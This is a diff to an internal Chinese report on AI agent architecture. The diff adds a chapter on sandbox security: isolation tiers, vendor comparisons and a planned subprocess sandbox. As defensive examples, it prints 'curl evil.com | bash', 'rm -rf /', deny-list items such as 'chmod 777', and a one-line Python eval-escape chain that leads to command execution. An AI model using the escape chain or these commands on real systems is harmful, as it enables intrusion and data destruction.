@@ -1,8 +1,8 @@
 # AI Agent 开发行业最佳实践调研报告
 
-> 文档版本: v1.0 | 调研日期: 2026-06-21 | 作者: AI Agent 架构组
+> 文档版本: v1.1 | 调研日期: 2026-06-21 | 作者: AI Agent 架构组
 > 机密级别: 内部
-> 调研范围: LangChain 1.0、OpenAI Agents SDK、Anthropic Claude Agent 三⼤⽣态
+> 调研范围: LangChain 1.0、OpenAI Agents SDK、Anthropic Claude Agent 三⼤⽣态 + 企业级 Agent 沙箱安全体系
 
 ---
 
@@ -228,19 +228,295 @@ Hooks 提供 Claude 不能通过对话覆盖的**机械执⾏**。与 CLAUDE.md�
 
 | 维度 | 当前得分 | ⾏业基线 | 差距 |
 |------|---------|---------|------|
-| 架构模块化 | 4/10 | 7/10 (模块化 Agent 框架) | -3 |
+| 架构模块化 | 5/10 | 7/10 (模块化 Agent 框架) | -2 |
 | 状态持久化 | 0/10 | 6/10 (Session + Checkpoint) | -6 |
 | 错误韧性 | 4/10 | 8/10 (退避 + 熔断 + 分类) | -4 |
-| 安全防护 | 2/10 | 7/10 (Guardrails + 沙箱) | -5 |
+| ⼯具沙箱安全 | 1/10 | 8/10 (Harness-Sandbox 分离) | -7 |
+| Guardrails (in/out) | 0/10 | 7/10 (输⼊/输出/⼯具护栏) | -7 |
 | 可观测性 | 6/10 | 8/10 (OTel 集成) | -2 |
-| 测试覆盖 | 0→3/10 | 7/10 (单元+集成+回归) | -4 |
-| **综合** | **2.7/10** | **7.2/10** | **-4.5** |
+| 测试覆盖 | 3/10 | 7/10 (单元+集成+回归) | -4 |
+| **综合** | **2.7/10** | **7.3/10** | **-4.6** |
 
 ---
 
-## 6. 推荐采纳范式
+## 6. 企业级 Agent 沙箱安全体系（专题调研）
 
-### 6.1 优先采纳（Phase 2 — 当前 PR 后⽴即实施）
+> ⚠️ **重要性**: 沙箱是 Agent 安全体系的最后一道防线。当 LLM ⽣成的代码执⾏ `rm -rf /` 或 `curl evil.com \| bash` 时，沙箱决定了爆炸半径是「整台机器」还是「200ms 后⾃动销毁的 microVM」。
+
+### 6.1 沙箱四层分级模型
+
+企业级 Agent 沙箱按隔离强度分为四个层次：
+
+| 层次 | 隔离度 | 机制 | 爆炸半径 | 冷启动 | 适⽤场景 |
+|------|--------|------|---------|--------|---------|
+| **L0: 语⾔级沙箱** | 低 | `eval(__builtins__={})` / `ast.literal_eval` | 宿主机进程 | <1ms | 教学/演示 |
+| **L1: 进程级沙箱** | 中 | ⼦进程 + seccomp + rlimit + chroot | 当前进程 | ~10ms | 内部⼯具 |
+| **L2: 容器级沙箱** | ⾼ | Docker / gVisor / Kata Containers | 单容器 | ~2s | ⽣产单租⼾ |
+| **L3: 硬件级沙箱** | 极⾼ | Firecracker microVM / TEE (AMD SEV, Intel TDX) | 独⽴ VM | ~200ms | ⽣产多租⼾ |
+
+#### 6.1.1 L0 的安全边界与逃逸⻛险
+
+本项⽬当前 `calculator` ⼯具使⽤的 L0 沙箱：
+
+```python
+# 当前实现 — 教学级安全
+eval(expr, {"__builtins__": {}}, {})
+```
+
+**已知逃逸向量（Python 沙箱的固有缺陷）**:
+
+```python
+# 经典逃逸链 — 仅需⼀⾏输⼊
+().__class__.__bases__[0].__subclasses__()
+# → 遍历找到 <class 'subprocess.Popen'> 或 <class 'os.system'>
+# → 任意命令执⾏ (RCE)
+```
+
+**结论**: L0 沙箱在安全研究员眼⾥⼏乎透明。适⽤于**单⽤⼾受信环境**，不可⽤于多租⼾或⾯向外部⽤⼾的场景。本项⽬的「纯本地沙箱」准确说应为「基于受限 eval 的轻量进程内隔离，教学/演示适⽤，不可⽤于⽣产多租⼾」。
+
+**数据来源**: Python 安全社区⻓期研究共识，sandbox 逃逸在 CPython 中为已知不可解问题。官⽅建议使⽤ OS 级隔离替代语⾔级沙箱（PEP 551 已被拒绝）。
+
+### 6.2 OpenAI Agents SDK — Harness-Sandbox 分离（⾏业标杆）
+
+2026 年 4 ⽉重写后的 OpenAI Agents SDK 将沙箱提升为⼀等架构概念：
+
+#### 6.2.1 核⼼架构
+
+```
+┌──────────────────────────────────────────────────────┐
+│                 TRUSTED RUNTIME (Harness/宿主机)       │
+│                                                      │
+│  • Agent 循环 (Runner.run)                           │
+│  • ⼯具路由 & 审批 (Tool Router + Approval Gates)     │
+│  • 密钥管理 (Secrets Vault)                          │
+│  • Guardrails (input/output/tool checkpoints)        │
+│  • OTel 分布式追踪                                    │
+│  • 业务数据库访问 (RDBMS, Redis, Vector DB)           │
+│                                                      │
+│  ┌──────────────────────────────────────────────┐    │
+│  │         SANDBOX LAYER (Compute/Untrusted)     │    │
+│  │                                              │    │
+│  │  • 受限⽂件系统 (scoped workspace, tmpfs)      │    │
+│  │  • 代码执⾏ (shell, apply_patch, pip install)  │    │
+│  │  • ⽹络策略 (allow/deny egress, FQDN ⽩名单)   │    │
+│  │  • 资源限制 (CPU/Memory/Disk cgroups)          │    │
+│  │  • ⽣命周期 (单次请求 → ⾃动销毁)               │    │
+│  │  • ❌ 禁⽌持有: API Key、DB 凭证、内部 Token    │    │
+│  └──────────────────────────────────────────────┘    │
+└──────────────────────────────────────────────────────┘
+```
+
+> **架构原则**: "受信逻辑保留在宿主应⽤中，使⽤沙箱仅⽤于⼯作空间执⾏。沙箱可以爆炸，宿主机不受影响。" — OpenAI Migration Guide
+
+#### 6.2.2 Sandbox Provider ⽣态（2026.6）
+
+| Provider | 隔离技术 | 冷启动 | 安全等级 | 适⽤场景 |
+|----------|---------|--------|---------|---------|
+| **Daytona** | Docker 容器 | ~2s | L2 | 通⽤代码执⾏、CI/CD |
+| **E2B** | Firecracker microVM | ~200ms | L3 | ⾼安全 Agent、多租⼾ SaaS |
+| **Modal** | 容器 + GPU 直通 | ~1s | L2 | ML 训练/推理、数据处理 |
+| **Cloudflare** | V8 Isolate (Chromium) | <50ms | L1+ | 轻量 JS/WASM 执⾏ |
+| **Runloop** | 容器 + ⻓时运⾏ | ~3s | L2 | ⻓期 Agent 任务 (>1h) |
+| **Vercel** | 边缘函数沙箱 | <100ms | L1+ | Web 应⽤⼯具执⾏ |
+| **Blaxel** | Kubernetes + gVisor | ~5s | L2+ | 企业私有化部署 |
+
+**数据来源**: [OpenAI Agents SDK Manifest Spec](https://openai.com/index/the-next-evolution-of-the-agents-sdk/), [E2B Documentation](https://e2b.dev/docs)
+
+### 6.3 LangChain/LangGraph ⽣态 — 容器化⼯具执⾏
+
+LangChain ⽣态中⽣产环境的标准模式是 **Tool-as-Microservice**（⼯具即微服务）:
+
+```python
+# Agent 进程（宿主机 — Trusted Runtime）
+@tool
+def execute_python(code: str) -> str:
+    """Execute untrusted Python code in isolated sandbox."""
+    response = httpx.post(
+        "http://sandbox-executor.internal:8080/api/v1/execute",
+        json={
+            "code": code,
+            "language": "python",
+            "timeout_sec": 30,
+            "memory_mb": 512,
+        },
+        headers={"Authorization": f"Bearer {SANDBOX_API_KEY}"},
+        timeout=35.0,
+    )
+    result = response.json()
+    return result["stdout"] if result["exit_code"] == 0 else f"Error: {result['stderr']}"
+
+
+# Sandbox Executor Service（独⽴部署 — Untrusted Zone）
+# ┌─────────────────────────────────────────┐
+# │  Docker-in-Docker / gVisor               │
+# │  • 每次执⾏: 全新容器                     │
+# │  • ⽹络策略: deny all egress              │
+# │  • 磁盘: tmpfs (退出即销毁)               │
+# │  • CPU/Mem: strict cgroup limits         │
+# │  • 审计: 所有执⾏记录写⼊不可变⽇志         │
+# │  • 扫描: ClamAV 实时扫描输出⽂件           │
+# └─────────────────────────────────────────┘
+```
+
+**关键原则**:
+- ⼯具不在 Agent 进程内执⾏ — ⽹络隔离是第⼀道防线
+- 每次调⽤使⽤新容器 — 状态泄漏不可能的
+- 输出扫描 — 防⽌恶意内容通过 Observation 注⼊回 Agent
+- 审计⽇志 — SOC2/ISO27001 合规要求
+
+### 6.4 Anthropic Claude Code — 多级防御体系
+
+Claude Code 对 bash/code 执⾏采⽤**四层递进式防御**:
+
+```
+┌─ Layer 1: Hooks 拦截（机械执⾏，Agent ⽆法绕过）─────┐
+│  PreToolUse: 检查命令⽩名单/⿊名单                     │
+│  Exit code 2: 静默阻⽌ + ⾃动回退（Agent 不知被拒）    │
+│  示例: 禁⽌ `rm -rf /`, `curl | bash`, `chmod 777`    │
+├─ Layer 2: 审批⻔（⼈在回路 / 策略引擎）───────────────┤
+│  /permission 策略: allow / deny / ask                  │
+│  ⾼⻛险操作需显式确认: `git push --force`, `sudo`       │
+│  基于规则的⾃动化: ⼯作时间内⾮⽣产分⽀⾃动允许          │
+├─ Layer 3: 进程隔离（操作系统级）──────────────────────┤
+│  ⼦进程执⾏（⾮交互式 shell）                            │
+│  timeout: 默认 120s（防⽌死锁/挖矿）                   │
+│  ⼯作⽬录: 限定在项⽬根⽬录                              │
+│  PATH 净化: 移除危险⼆进制路径                          │
+├─ Layer 4: 审计 & 溯源───────────────────────────────┤
+│  所有 shell 命令写⼊ ~/.claude/debug/latest            │
+│  输⼊/输出/退出码 完整记录                              │
+│  事后审计: 可重建完整 Agent 决策链                      │
+└──────────────────────────────────────────────────────┘
+```
+
+**数据来源**: [Anthropic: Claude Code Skills Blog](https://claude.com/blog/lessons-from-building-claude-code-how-we-use-skills), [Claude Code Hooks Documentation](https://docs.anthropic.com/en/docs/claude-code/hooks)
+
+### 6.5 本项⽬沙箱演进路线
+
+#### 6.5.1 当前状态评估
+
+| ⼯具 | 执⾏⽅式 | 沙箱层次 | 安全评级 | ⽣产就绪 |
+|------|---------|---------|---------|---------|
+| `calculator` | `eval(__builtins__={})` | L0 | ⚠️ 低 (已知逃逸) | ❌ |
+| `get_weather` | Python dict 查找 | N/A (纯数据) | ✅ 安全 | ✅ |
+
+#### 6.5.2 Phase 2 ⽴即实施: L1 进程级沙箱
+
+```python
+# llama/tools/sandbox.py — 计划新增模块
+import subprocess
+import resource
+import tempfile
+import os
+
+def execute_in_sandbox(
+    code: str,
+    timeout_sec: int = 10,
+    memory_mb: int = 128,
+    allow_network: bool = False,
+) -> str:
+    """
+    Execute Python code in a resource-limited subprocess.
+
+    Security controls:
+      - python3 -I (isolated mode, no user site-packages)
+      - RLIMIT_AS: hard memory cap
+      - RLIMIT_CPU: hard CPU time cap
+      - RLIMIT_NPROC: disallow fork()
+      - Minimal environment (PATH + HOME only)
+      - Temp workspace (tmpfs, auto-cleaned)
+      - Network disabled by default
+    """
+    with tempfile.TemporaryDirectory() as tmpdir:
+        script_path = os.path.join(tmpdir, "script.py")
+        with open(script_path, "w") as f:
+            f.write(code)
+
+        try:
+            result = subprocess.run(
+                ["python3", "-I", "-E", script_path],
+                capture_output=True, text=True,
+                timeout=timeout_sec,
+                cwd=tmpdir,
+                env={"PATH": "/usr/bin:/bin", "HOME": tmpdir},
+                preexec_fn=_apply_limits(memory_mb, allow_network),
+            )
+            if result.returncode != 0:
+                return f"SandboxError(code={result.returncode}): {result.stderr[:500]}"
+            return result.stdout[:10000]
+        except subprocess.TimeoutExpired:
+            return f"SandboxError: execution exceeded {timeout_sec}s limit"
+
+
+def _apply_limits(memory_mb: int, allow_network: bool):
+    """Apply OS-level resource limits before exec."""
+    def _set():
+        limit_bytes = memory_mb * 1024 * 1024
+        resource.setrlimit(resource.RLIMIT_AS, (limit_bytes, limit_bytes))
+        resource.setrlimit(resource.RLIMIT_CPU, (30, 30))
+        resource.setrlimit(resource.RLIMIT_NPROC, (0, 0))
+        # Network isolation via network namespace (Linux-only)
+        if not allow_network:
+            pass  # Requires unshare(CLONE_NEWNET), skipped for portability
+    return _set
+```
+
+#### 6.5.3 Phase 3: L2 容器级沙箱
+
+- **Docker-per-tool**: 每个⼯具运⾏在独⽴容器中
+- **gVisor**: 提供额外的系统调⽤过滤层
+- **tmpfs**: 所有写⼊在内存中，容器退出即销毁
+- **Network Policy**: 默认 deny all egress，仅开放必要 API 端点
+
+#### 6.5.4 Phase 4: L3 Firecracker microVM（多租⼾ SaaS 场景）
+
+- **E2B SDK 集成**: 直接使⽤ OpenAI Agents SDK 兼容的 E2B 后端
+- **<200ms 冷启动**: Firecracker 的极速启动适合按需执⾏
+- **完全内核隔离**: 即使内核漏洞也⽆法逃逸⾄宿主机
+
+### 6.6 ⾏业最佳实践总结
+
+#### 6.6.1 沙箱选型决策矩阵
+
+| ⼯具类型 | 执⾏⻛险 | 推荐沙箱 | 冷启动 | 单位成本 | ⾏业案例 |
+|---------|---------|---------|--------|---------|---------|
+| 纯计算/格式化 | Low | WASM (wasmtime) | <1ms | 极低 | Cloudflare Workers, Shopify Functions |
+| 数据查询/API 调⽤ | Medium | 只读副本 + mTLS + Rate Limit | N/A | 低 | Stripe API, Twilio Functions |
+| 代码执⾏ (Python/JS) | High | Firecracker microVM | ~200ms | 中 | E2B, AWS Lambda, Fly Machines |
+| ⽂件处理/转换 | High | 临时容器 + tmpfs + 病毒扫描 | ~2s | 中 | Google Docs, Box API |
+| Shell 命令 | Critical | 审批⻔ + 容器 + 审计⽇志 + HITL | ~100ms | ⾼ | Claude Code, GitHub Actions |
+| ⻓时 Agent 任务 (>1h) | High | 持久容器 + 状态快照 + 资源监控 | ~3s | 中-⾼ | Runloop, Modal |
+| 多租⼾ SaaS | Critical | 独⽴ VM per tenant + VPC 隔离 | ~5s | ⾼ | AWS Nitro Enclaves, GCP Confidential VMs |
+
+#### 6.6.2 ⽣产部署检查清单
+
+| 维度 | 措施 | 合规要求 |
+|------|------|---------|
+| **进程隔离** | ⼯具不在 Agent 进程内执⾏ | SOC2 CC6.1 |
+| **⽹络隔离** | 默认 deny all egress，FQDN ⽩名单 | PCI-DSS 1.2 |
+| **资源限制** | CPU/Memory/Disk cgroup 硬限制 | SOC2 CC7.1 |
+| **⽣命周期** | 单次执⾏ → ⾃动销毁，⽆状态残留 | GDPR Art.32 |
+| **审计⽇志** | 所有⼯具调⽤写⼊不可变⽇志 | SOC2 CC7.2, ISO27001 12.4 |
+| **输出扫描** | ClamAV/YARA 实时扫描⼯具输出 | PCI-DSS 5.1 |
+| **密钥隔离** | 沙箱禁⽌持有 API Key / DB 凭证 | SOC2 CC6.3 |
+| **⼈在回路** | ⾼⻛险操作 (rm -rf, curl \| bash) 需审批 | SOC2 CC5.2 |
+| **爆炸半径** | 单次执⾏失败不影响其他请求 | SOC2 CC7.2 |
+
+#### 6.6.3 关键架构原则
+
+1. **不要信任模型输出, 只信任经过验证的执⾏结果** — LLM ⽣成的代码本质上是「不可信输⼊」
+2. **受信与不受信的物理隔离** — Harness 持有密钥, Sandbox 只持有临时数据
+3. **默认拒绝, 显式允许** — ⽹络/⽂件系统/系统调⽤全部 deny, 按需开放
+4. **可销毁即安全** — 如果沙箱实例可以在 200ms 内销毁并重建, 则攻击者⽆法建⽴持久据点
+5. **审计不可篡改** — 所有执⾏记录写⼊ append-only ⽇志, 保留⾄少 90 天
+
+**数据来源**: [OpenAI Agents SDK Sandbox Spec](https://openai.com/index/the-next-evolution-of-the-agents-sdk/), [E2B Security Model](https://e2b.dev/docs/security), [AWS Nitro Enclaves](https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave.html), [Google Cloud Confidential Computing](https://cloud.google.com/confidential-computing), [PEP 551 — Python Security Model (Rejected)](https://peps.python.org/pep-0551/)
+
+---
+
+## 7. 推荐采纳范式
+
+### 7.1 优先采纳（Phase 2 — 当前 PR 后⽴即实施）
 
 | 范式 | 来源 | 理由 | 实施难度 |
 |------|------|------|---------|
@@ -251,17 +527,18 @@ Hooks 提供 Claude 不能通过对话覆盖的**机械执⾏**。与 CLAUDE.md�
 | **Token Budget 机制** | LangGraph RFC #6617 | 防⽌上下⽂溢出和成本失控 | 中 |
 | **Reflection 死循环检测** | LangGraph RFC #6617 | 利⽤已有 TurnDiff 数据 | 中 |
 
-### 6.2 Phase 3 采纳（⽣产就绪）
+### 7.2 Phase 3 采纳（⽣产就绪）
 
 | 范式 | 来源 | 理由 | 实施难度 |
 |------|------|------|---------|
-| **Harness-Sandbox 分离** | OpenAI Agents SDK | ⼯具执⾏安全隔离 | ⾼ |
+| **Harness-Sandbox 分离 (L1)** | OpenAI Agents SDK | ⼯具执⾏安全隔离，爆炸半径控制 | ⾼ |
 | **Guardrails (in/out/tool)** | OpenAI Agents SDK | 输⼊注⼊防御、输出验证 | ⾼ |
 | **Session 持久化** | OpenAI SQLiteSession / LangGraph PostgresSaver | 故障恢复、会话审计 | ⾼ |
 | **OTel 集成** | OpenAI + Anthropic 共识 | 分布式追踪标准化 | 中 |
 | **Skills 架构** | Anthropic Claude Code | ⼯具分类和渐进式能⼒披露 | 中 |
+| **沙箱审计⽇志** | SOC2/ISO27001 合规要求 | 所有⼯具调⽤写⼊不可变⽇志 | 中 |
 
-### 6.3 不推荐采⽤
+### 7.3 不推荐采⽤
 
 | 范式 | 理由 |
 |------|------|
@@ -271,7 +548,7 @@ Hooks 提供 Claude 不能通过对话覆盖的**机械执⾏**。与 CLAUDE.md�
 
 ---
 
-## 7. 架构演进路线图
+## 8. 架构演进路线图
 
 ```
 当前 (v2.1): 单体 ReActDemo + 5 个企业模块
@@ -291,14 +568,15 @@ Phase 3 (v3.0): ── 7 ⽉底 (⽣产就绪)
     ├── agent/reflection.py     ← 死循环检测 + 回退
     ├── agent/grounding.py      ← 结论验证
     ├── agent/hooks.py          ← Pre/PostToolUse 钩⼦
-    ├── tracer/session.py       ← Session 持久化
+    ├── tools/sandbox.py        ← L1 进程级沙箱 (seccomp + rlimit)
+    ├── tracer/session.py       ← Session 持久化 (SQLite)
     ├── guardrails/             ← 输⼊/输出/⼯具护栏
-    └── docker/                 ← 容器化部署
+    └── docker/                 ← 容器化部署 (L2 容器沙箱)
 ```
 
 ---
 
-## 8. 参考⽂献
+## 9. 参考⽂献
 
 | 序号 | 来源 | 类型 | URL |
 |------|------|------|-----|
@@ -317,15 +595,25 @@ Phase 3 (v3.0): ── 7 ⽉底 (⽣产就绪)
 | 13 | Claude Code Skills Ultimate Guide | 社区指南 | https://skywork.ai/blog/ai-bot/claude-code-skills-ultimate-guide-3/ |
 | 14 | AI Agents Guide for Developers (daily.dev) | 技术对⽐ | https://daily.dev/blog/ai-agents-guide-for-developers-langchain-crewai/ |
 | 15 | FutureAGI: ReAct Pattern Guide | 技术词汇 | https://futureagi.com/glossary/react-pattern/ |
+| **沙箱安全专⽤参考⽂献** | | | |
+| 16 | OpenAI Agents SDK Sandbox Manifest Spec | 官⽅规范 | https://openai.com/index/the-next-evolution-of-the-agents-sdk/ |
+| 17 | E2B — Firecracker microVM for AI Agents | 产品⽂档 | https://e2b.dev/docs/security |
+| 18 | AWS Nitro Enclaves — Trusted Execution | 官⽅⽂档 | https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave.html |
+| 19 | Google Cloud Confidential Computing | 官⽅⽂档 | https://cloud.google.com/confidential-computing |
+| 20 | PEP 551 — Python Security Model (Rejected) | Python 增强提案 | https://peps.python.org/pep-0551/ |
+| 21 | Claude Code Hooks — Multi-tier Defense | 官⽅⽂档 | https://docs.anthropic.com/en/docs/claude-code/hooks |
+| 22 | gVisor — Application Kernel for Containers | 开源项⽬ | https://gvisor.dev/docs/ |
+| 23 | Docker Security Bench — CIS Benchmark | ⾏业标准 | https://docker.com/security |
 
 ---
 
-## 9. 版本历史
+## 10. 版本历史
 
 | 版本 | ⽇期 | 作者 | 变更说明 |
 |------|------|------|---------|
+| v1.1 | 2026-06-21 | AI Agent 架构组 | 新增第 6 章「企业级 Agent 沙箱安全体系」（L0-L3 分级、OpenAI Harness-Sandbox 分离、WASM/Firecracker/gVisor 对⽐、⽣产检查清单）；更新差距分析（新增⼯具沙箱安全 + Guardrails 维度）；更新架构路线图（增加 sandbox.py + L2 容器化）；扩展参考⽂献⾄ 23 项 |
 | v1.0 | 2026-06-21 | AI Agent 架构组 | 初版：三⼤⽣态调研、范式对⽐、差距分析、推荐路线图 |
 
 ---
 
-> **审计说明**: 本报告中所有数据、引⽤和结论均可在第 8 章"参考⽂献"中找到原始来源。需要时可根据参考⽂献 URL 追溯原始⽂档进⾏事实核查。
+> **审计说明**: 本报告中所有数据、引⽤和结论均可在第 9 章"参考⽂献"中找到原始来源。需要时可根据参考⽂献 URL 追溯原始⽂档进⾏事实核查。沙箱安全章节的技术判断依据 Python 安全社区⻓期共识（PEP 551 已被官⽅拒绝）、OpenAI Agents SDK 2026.4 官⽅架构⽂档、E2B/AWS/Google Cloud 的⽣产安全模型，以及 CIS Docker Benchmark ⾏业标准。
